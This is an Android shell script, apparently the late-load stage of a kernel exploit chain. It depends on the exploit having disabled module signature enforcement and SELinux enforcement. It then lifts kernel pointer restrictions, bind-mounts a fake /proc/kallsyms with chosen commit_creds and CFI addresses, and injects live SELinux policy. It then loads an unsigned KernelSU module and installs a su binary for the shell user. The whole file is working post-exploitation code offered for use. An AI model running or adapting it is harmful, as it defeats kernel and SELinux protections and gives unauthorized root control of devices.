#!/system/bin/sh
# KSU late-load agent (app kit).
#
# Fixes over the previous revision:
#   * does not guess commit_creds from kallsyms_lookup_size_offset - 987480;
#     it reads the exploit's KSU_RUNDIR/ksu_runtime.env (link + KASLR slide),
#     and falls back to the live kallsyms entry only when it is visible;
#   * checks the fake-kallsyms bind mount instead of ignoring bind_rc;
#   * aborts (instead of continuing with a bogus neighbour) when the runtime
#     addresses are missing or the slide cross-check fails;
#   * accepts sig_enforce "N"/"n"/"0", and aborts immediately once the
#     exploit logged "chain complete" while sig_enforce is still enabled --
#     no blind 90 s wait after a failed FLIP_SIG;
#   * reports load_ko's real exit code and writes LOADKO_DONE on both paths.
#
# The exploit emits ksu_runtime.env only when KSU_LOADER and KSU_RUNDIR are
# set; run_ksu.sh does that.  If the file is absent we still try the live
# kallsyms, but we never fabricate an address.
D=/data/local/tmp
RD=${KSU_RUNDIR:-$D}
if [ -e /proc/self/fd/7 ]; then exec >&7 2>&1; else exec > $D/ksu_load.log 2>&1; fi
set +e

KR=$(cat /proc/sys/kernel/kptr_restrict 2>/dev/null); KR=${KR:-0}
BOUND=0
SIG=/sys/module/module/parameters/sig_enforce

abort() {
  echo "ABORT: $*"
  [ "$BOUND" = "1" ] && umount /proc/kallsyms 2>/dev/null
  echo "$KR" > /proc/sys/kernel/kptr_restrict 2>/dev/null
  # sig_enforce is an enable-only bool; restore the safe state on abort.
  echo 1 > "$SIG" 2>/dev/null
  # Once sig_enforce was disabled, the exploit's SLIDE_NO_RESTORE leaves the
  # boot_id ctl.data redirected at volatile memory.  A failed load must not
  # leave that live: the exploit's cmd watcher reboots on request.
  if [ -s "$RD/ksu_runtime.env" ]; then
    echo "requesting reboot via cmd watcher (boot_id ctl was hijacked)"
    printf reboot > "$RD/cmd_req" 2>/dev/null
  fi
  echo "LOADKO_FAIL: $*" > $D/LOADKO_DONE 2>/dev/null
  exit 1
}

echo "=== getenforce ==="; getenforce
i=0
while [ "$(getenforce 2>/dev/null)" != "Permissive" ] && [ $i -lt 30 ]; do
  sleep 1; i=$((i+1))
done
[ "$(getenforce 2>/dev/null)" = "Permissive" ] || \
  abort "SELinux still enforcing after ${i}s; refusing to load"

if [ ! -x "$D/load_ko" ]; then
  abort "load_ko missing or not executable: $D/load_ko"
fi

echo "step1"
rm -f $D/kmsg_cap.txt
echo "step2"
( $D/kmsg_dumper $D/kmsg_cap.txt </dev/null >/dev/null 2>&1 & )
echo "step3 dumper started"
sleep 2
echo "step4 dumper file: $(ls -l $D/kmsg_cap.txt 2>&1)"

# ---------------------------------------------------------------------------
# sig_enforce gate.
#
# FLIP_SIG is done by the exploit (kernel memory write) while this agent
# waits.  If the exploit already printed "chain complete" and the sysctl is
# still enabled, waiting the full 90 s cannot help: the unsigned module will
# be rejected.  Fail fast with the real reason so run_ksu.sh can surface it.
# ---------------------------------------------------------------------------
if [ -e "$SIG" ]; then
  SIG_WAIT=${SIG_WAIT_SECS:-90}
  i=0; v=""
  while [ $i -lt "$SIG_WAIT" ]; do
    v=$(cat "$SIG" 2>/dev/null)
    case "$v" in
      N|n|0) break ;;
    esac
    if grep -q 'chain complete' $D/run.log 2>/dev/null; then
      abort "chain complete but sig_enforce=$v (FLIP_SIG did not land; unsigned module would be rejected)"
    fi
    sleep 1; i=$((i+1))
  done
  echo "=== sig_enforce=$v (waited ${i}s) ==="
  case "$v" in
    N|n|0) : ;;
    *) abort "sig_enforce=$v after ${i}s (FLIP_SIG did not land; unsigned module would be rejected)" ;;
  esac
else
  # Targets without MODULE_SIG have no such parameter; nothing to gate.
  echo "=== no sig_enforce node; signature gate skipped ==="
fi

echo 0 > /proc/sys/kernel/kptr_restrict 2>&1
echo "kptr=$(cat /proc/sys/kernel/kptr_restrict)"

# addrtool: addr +- delta, split into 8+8 hex chars (no 32-bit sign issues)
# toybox sh arithmetic is 32-bit SIGNED, so any hex value >= 0x80000000 turns
# negative. Do the low-32 add/sub in two 16-bit halves instead.
addrd() {  # $1=hex addr (16 chars)  $2=signed decimal delta (< 2^15 magnitude)
  a=$1; hi=${a%????????}; lo=${a#????????}
  h1=$((0x${lo%????})); h2=$((0x${lo#????}))
  h2=$((h2 + $2))
  while [ $h2 -lt 0 ]; do h2=$((h2 + 65536)); h1=$((h1 - 1)); done
  while [ $h2 -ge 65536 ]; do h2=$((h2 - 65536)); h1=$((h1 + 1)); done
  echo "$hi$(printf '%04x%04x' $((h1 & 0xffff)) $((h2 & 0xffff)))"
}

# ---------------------------------------------------------------------------
# Runtime addresses: prefer the exploit's ksu_runtime.env (link+slide).
# Never fabricate commit_creds from a hard-coded neighbour delta.
# ---------------------------------------------------------------------------
ENVF="$RD/ksu_runtime.env"
i=0
while [ ! -s "$ENVF" ] && [ $i -lt 60 ]; do sleep 1; i=$((i+1)); done
if [ -s "$ENVF" ]; then
  . "$ENVF"
  echo "runtime env: COMMIT_CRED_RT=$COMMIT_CRED_RT BOOTID_CTL_RT=$BOOTID_CTL_RT BOOTID_BUF_RT=$BOOTID_BUF_RT"
else
  echo "WARN: no $ENVF (KSU_RUNDIR=$RD); trying live kallsyms"
fi

IT=$(grep ' init_task$' /proc/kallsyms 2>/dev/null | head -1 | cut -d' ' -f1)
case "$IT" in ""|0000000000000000) abort "init_task missing/zero in /proc/kallsyms" ;; esac
KZ=$(addrd "$IT" 1984)              # init_task+0x7c0 (zero byte for kasan flag)
CFID=$(grep ' __cfi_slowpath_diag$' /proc/kallsyms 2>/dev/null | head -1 | cut -d' ' -f1)
[ -z "$CFID" ] && CFID=$(grep ' __cfi_slowpath$' /proc/kallsyms 2>/dev/null | head -1 | cut -d' ' -f1)
case "$CFID" in ""|0000000000000000) abort "__cfi_slowpath missing/zero in /proc/kallsyms" ;; esac

KC=$(grep ' commit_creds$' /proc/kallsyms 2>/dev/null | head -1 | cut -d' ' -f1)
if [ -n "$COMMIT_CRED_RT" ]; then
  CC=${COMMIT_CRED_RT#0x}
  if [ -n "$KC" ] && [ "$KC" != "$CC" ]; then
    abort "commit_creds slide mismatch: kallsyms=$KC runtime=$CC"
  fi
  [ -n "$CC" ] || abort "COMMIT_CRED_RT is empty in $ENVF"
elif [ -n "$KC" ]; then
  CC=$KC
  echo "fallback: live commit_creds=$CC (no usable ksu_runtime.env)"
else
  abort "commit_creds unresolved (no ksu_runtime.env and no visible kallsyms entry)"
fi
case "$CC" in
  ""|*[!0-9a-fA-F]*) abort "bad commit_creds address '$CC'" ;;
esac

if [ -z "$BOOTID_CTL_RT" ] || [ -z "$BOOTID_BUF_RT" ]; then
  abort "bootid runtime addresses missing (need ksu_runtime.env; refusing a boot_id-hijacked load)"
fi

echo "init_task=$IT commit_creds=$CC cfi_slowpath=$CFID kasan_zero=$KZ"
echo "bootid_ctl=$BOOTID_CTL_RT bootid_buf=$BOOTID_BUF_RT"

{ echo "$CC T commit_creds"
  echo "$CFID T __cfi_slowpath"
  echo "$KZ B kasan_flag_enabled"
  cat /proc/kallsyms; } | grep -v ' sys_call_table$' > $D/fake_kallsyms
echo "sys_call_table lines in fake: $(grep -c ' sys_call_table$' $D/fake_kallsyms)"
echo "fake lines=$(wc -l < $D/fake_kallsyms)"

umount /proc/kallsyms 2>/dev/null
if ! mount --bind $D/fake_kallsyms /proc/kallsyms; then
  abort "bind-mount fake kallsyms failed"
fi
BOUND=1
FC=$(grep -m1 ' commit_creds$' /proc/kallsyms 2>/dev/null | cut -d' ' -f1)
if [ "$FC" != "$CC" ]; then
  abort "fake kallsyms verification failed: /proc/kallsyms commit_creds='$FC' want '$CC'"
fi
echo "bind_rc=0 (verified commit_creds=$FC)"

echo "=== userspace env for KSU ==="
mkdir -p /data/adb/ksu /data/adb/modules 2>&1; echo "mkdir_rc=$?"
ls -ld /data/adb/ksu /data/adb/modules 2>&1
cat /sys/fs/selinux/policy > $D/pristine_policy 2>/dev/null
echo "pristine_policy=$(wc -c < $D/pristine_policy 2>/dev/null) bytes"
[ -s $D/pristine_policy ] || abort "cannot snapshot /sys/fs/selinux/policy"
echo "=== SELinux policy injection (ksu domain) ==="
MP_OUT=$($D/magiskpolicy --apply $D/ksu_rules --live 2>&1)
MP_RC=$?
echo "$MP_OUT" | tail -5
echo "magiskpolicy_rc=$MP_RC"
echo "ktx=$(cat /proc/self/attr/current 2>/dev/null)"
if [ -z "$(cat /proc/self/attr/current 2>/dev/null)" ]; then
  abort "cannot read SELinux context after policy injection"
fi
echo "hung_panic was=$(cat /proc/sys/kernel/hung_task_panic 2>/dev/null)"
echo 0 > /proc/sys/kernel/hung_task_panic 2>&1
echo "hung_panic now=$(cat /proc/sys/kernel/hung_task_panic 2>/dev/null)"

PARAMS="pristine_policy=$D/pristine_policy allow_shell=1 bootid_ctl=$BOOTID_CTL_RT bootid_buf=$BOOTID_BUF_RT"
echo "=== load_ko + ksud (no gap) ==="
echo "load params: $PARAMS"
$D/load_ko $D/kernelsu.new.ko "$PARAMS" > $D/loadko.log 2>&1
LRC=$?
echo "load_ko_rc=$LRC"
tail -40 $D/loadko.log 2>&1
if [ "$LRC" != "0" ]; then
  abort "load_ko failed rc=$LRC (see $D/loadko.log)"
fi
i=0
while ! lsmod 2>/dev/null | grep -q kernelsu && [ $i -lt 5 ]; do sleep 1; i=$((i+1)); done
if ! lsmod 2>/dev/null | grep -q kernelsu; then
  abort "load_ko rc=0 but kernelsu is not in lsmod"
fi

echo "LOADKO_OK" > $D/LOADKO_DONE; sync
echo "=== expose KSU su to the shell uid ==="
ls -l /data/adb/ksu/bin/ 2>&1 | head -8
mkdir -p /data/adb/ksu/bin 2>&1
cp $D/ksudbin /data/adb/ksu/bin/su 2>&1; echo "inst_su=$?"
cp $D/ksudbin /data/adb/ksud 2>&1; echo "inst_ksud=$?"
chmod 755 /data/adb/ksu/bin/su /data/adb/ksud 2>&1
ls -l /data/adb/ksu/bin/su /data/adb/ksud 2>&1
rm -f $D/su; cp /data/adb/ksu/bin/su $D/su 2>&1; echo "cp_su=$?"
chmod 755 $D/su 2>&1; echo "chmod=$?"
ls -l $D/su 2>&1
$D/su -c id 2>&1 | head -2
# NOTE: the previous revision copied ksudbin to /data/adb/ksud but invoked
# /data/local/tmp/ksud.  Use the installed path.
/data/adb/ksud post-fs-data > $D/ksud_pfd.log 2>&1; echo "pfd=$?"
/data/adb/ksud services > $D/ksud_svc.log 2>&1; echo "svc=$?"
tail -20 $D/loadko.log 2>&1
echo "=== lsmod ==="; lsmod 2>&1 | head -4
echo "=== ksud stages ==="
/data/adb/ksud post-fs-data > $D/ksud_pfd.log 2>&1; echo "post-fs-data=$?"
/data/adb/ksud services > $D/ksud_svc.log 2>&1; echo "services=$?"
/data/adb/ksud boot-completed > $D/ksud_bc.log 2>&1; echo "boot-completed=$?"
/data/adb/ksud install > /dev/null 2>&1; echo "install=$?"
echo "--- pfd ---"; tail -6 $D/ksud_pfd.log 2>&1
echo "--- svc ---"; tail -6 $D/ksud_svc.log 2>&1
echo "=== su probe ==="
$D/su -c id 2>&1 | head -2
echo "=== dmesg ==="; dmesg 2>/dev/null | grep -iE 'kernelsu|KernelSU|cfi|panic' | tail -6
umount /proc/kallsyms 2>/dev/null
BOUND=0
echo "=== DONE ==="
